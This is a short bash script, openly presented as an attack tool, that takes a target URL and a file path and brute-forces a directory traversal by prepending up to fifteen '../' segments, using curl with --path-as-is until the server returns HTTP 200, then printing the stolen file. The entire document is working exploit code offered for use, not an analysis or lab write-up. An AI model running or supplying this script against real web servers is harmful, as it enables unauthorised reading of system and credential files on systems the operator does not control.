#!/bin/bash 



#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


function helpPanel(){

  echo -e "\n${redColour}[!] Usage: $0${endColour}"
  for i in $(seq 1 80); do echo -ne "${redColour}-"; done; echo -ne "${endColour}"
  echo -e "\n\n\t${grayColour}[-u]${endColour} ${yellowColour}Url to attack${endColour}"
  echo -e "\n\t${grayColour}[-f]${endColour} ${yellowColour}File to read${endColour}\n"

}

function sendPayload(){

  for i in $(seq 1 15); do 
    
    string="../"
    payload+=$string
    command=$(curl -s -o /dev/null --path-as-is -w %{http_code} "$url$payload$file")
  
    if [[ $command -eq 200 ]]; then
      echo -e "\n${grayColour}[+]${endColour} ${yellowColour}The payload${endColour} ${greenColour}$url$payload$file${endColour} ${yellowColour}returned the following content
:\n${endColour}"
      curl -s --path-as-is $url$payload$file
      break
    fi


  done
}

while getopts "u:f:h:" arg; do 

  case $arg in
    u) url=$OPTARG; let parameter_counter+=1;;
    f) file=$OPTARG; let parameter_counter+=1;;
    h) helpPanel;;

  esac
  
done

if [[ $parameter_counter -eq 0 ]]; then 

  helpPanel

else 

  sendPayload

fi
